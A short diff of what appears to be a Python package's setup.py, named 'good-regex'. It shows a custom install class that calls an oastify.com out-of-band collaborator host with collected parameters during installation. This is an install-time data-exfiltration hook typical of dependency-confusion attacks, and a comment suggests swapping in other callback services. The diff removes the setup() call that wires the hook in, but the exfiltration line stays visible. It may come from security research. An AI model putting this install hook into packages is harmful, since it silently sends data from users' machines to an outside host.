@@ -15,11 +15,5 @@ class CustomInstall(install):
         requests.get("fo7288ar9hjgo6tp8p6c1efxpovgja7z.oastify.com",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-setup(name='good-regex', #package name
-      version='1.0.0',
-      description='test',
-      author='test',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                              
 
